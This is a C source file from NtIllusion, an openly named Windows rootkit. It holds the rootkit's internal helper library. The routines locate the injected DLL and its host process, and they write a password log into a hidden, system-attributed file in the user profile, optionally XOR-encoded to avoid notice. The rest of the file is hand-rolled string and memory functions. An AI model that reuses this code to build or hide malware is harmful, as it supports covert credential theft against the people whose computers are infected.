/******************************************************************************
  kNTILib.c		: ROOTKIT MISC (Internal Library)
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/

#include <stdio.h>
#include <windows.h>
#include "kNTILib.h"
#include "kNTIConfig.h"

// ExtractPaths : extract info from module instance :
// - szExePath : path to exe loading the dll
// - szkNTIDllPath : full path to dll (used for injection)
// - pkNTIDllName : rootkit's dll name (used by the rootkit 
//   to prevent self hooking)
void ExtractPaths(HINSTANCE hInstance, char *szExePath, 
	char *szkNTIDllPath, char **pkNTIDllName)
{
	int lenght;
	
	// get the name of the process that was (forced ? ;p) to load the dll
	my_memset(szExePath, 0, 1024+1);
	GetModuleFileName(NULL,szExePath, MAX_PATH); //get exe path
	my_strtolower(szExePath); //Convert path to lower case
	
	// get the path & name of this dll
	my_memset(szkNTIDllPath, 0, MAX_PATH);
	lenght = GetModuleFileName((HMODULE)hInstance, (char*)szkNTIDllPath, MAX_PATH);
	my_strtolower((char*)szkNTIDllPath); //Convert path to lower case
	
	// set dll name pointer within dll full path buffer
	while(lenght>=0) {
		if(szkNTIDllPath[lenght--] == '\\') {
			(*pkNTIDllName) = (char*)(&szkNTIDllPath[lenght+2]);
			break;
		}
	}
}

//	Output2LogFile : Write a string to logfile (%user profile%\NTILLUSION_PASSLOG_FILE)
//  For instance : Output2LogFile("Hello!"); will add a new line containing [date/time] - Hello! into
//	log file (whose path looks like C:\Documents and Settings\Kdm\_ntiNTUSER32.DAT)
void Output2LogFile(char* frmstr,...)
{
	// encoding key required ?
#ifdef NTI_SECURE_LOGFILE
	int i;
	char XorKey = (char)NTI_SECURE_LOGKEY;
#endif

	int len=0;
	DWORD dNumWrt=0;
	HANDLE hLogFile=NULL;
	char buf[MAX_PATH*2];		// resolved format string 
	char usrprof[MAX_PATH];		// path to user profile directory
	char logline[MAX_PATH*2];	// line to write
	char logfile[MAX_PATH+64];	// path to log file
    SYSTEMTIME st;

	va_list vargs;
	va_start(vargs, frmstr);
	wvsprintfA(buf, frmstr, vargs); 
	va_end(vargs);
	
	// clear vars
	my_memset(usrprof, 0, MAX_PATH);
	my_memset(logline, 0, MAX_PATH*2);
	my_memset(logfile, 0, MAX_PATH+64);


	GetSystemTime (&st); 
	

	// build path to log file
	ExpandEnvironmentStrings("%USERPROFILE%", usrprof, MAX_PATH);
	wsprintf(logfile, "%s\\%s", (char*)usrprof, (char*)NTILLUSION_PASSLOG_FILE);
	// forge line
	//GetSystemTime(&SystemTime);
	wsprintf(logline, "[%.2d/%.2d/%.4d %.2d:%.2d:%.2d] - %s\r\n", st.wDay, st.wMonth, st.wYear, st.wHour, st.wMinute, st.wSecond, buf);
	len = my_strlen((char*)logline);
	// encode if needed :
#ifdef NTI_SECURE_LOGFILE
	for(i=0; i<len; i++)
		logline[i] ^= XorKey;
#endif
	hLogFile = CreateFile((char*)logfile, GENERIC_WRITE | GENERIC_READ, FILE_SHARE_READ, NULL,
	OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, NULL);
	if(hLogFile != INVALID_HANDLE_VALUE) {
		SetFilePointer(hLogFile, 0, 0, FILE_END);
		WriteFile(hLogFile, (char*)logline, len, &dNumWrt, 0);
		CloseHandle(hLogFile);
	}
	return;
}

//		OutputString : Send a formatted string to debugger output
//		todo : handle compatibility with Win 9x version
void OutputString(char* frmstr,...) {
 char buf[1024];
 va_list vargs;
 va_start(vargs, frmstr);
 wvsprintfA(buf, frmstr, vargs); 
 va_end(vargs);
 if(!VERBOSE_TURN_ALL_OFF)
	 OutputDebugString((char*)buf);
 
 // DEBUG ONLY!
 Output2LogFile((char*)buf);
 //if(fOutputDebugString) fOutputDebugString((char*)buf); 
 
 return;
} 

//In the case we can't find the real OutputDebugString, we redirect calls here to avoid process crash
void Our_OutputDebugString(LPCTSTR DontCare){
	return;
}

// Quick & poor implementation of strcmp (C library like)
int my_strcmp(char *a, char *b)
{
	int i=0;
  while( (*(a+i)) == (*(b+i)) && (*(a+i))!='\0' && (*(b+i))!='\0') //While chars are the same...
    i++; //...go on
  //if current char is \0 and last chars are identical, or if last chars are identical and one
  //string is only one letter long, return 0;
  if( (*(a+i)) == '\0' && (*(b+i)=='\0') && ( (*(a+i-1))==(*(b+i-1)) || i==1)) return 0;
  return 1; //strings are different, return non zero
}

// Quick & poor implementation of strlen (C library like)
int my_strlen(const char *str)
{
	int i=0;
	while(*str)
	{
		str++;
		i++;
	}
	return i;
}

// Quick & poor implementation of strtolower (C library like)
void my_strtolower(char* str)
{
	char* pos = str;
	for(; str <= (pos+my_strlen(pos)); str++)
		if((*str>='A') && (*str<='Z')) *str = *str + ('a'-'A');
		return;
}

// Quick & poor implementation of memset (C library like)
void my_memset(char *dSrc, char dValue, DWORD dCount)
{
	while(dCount)
	{
		(*dSrc) = dValue;
		dCount--;
		dSrc++;
	}
}
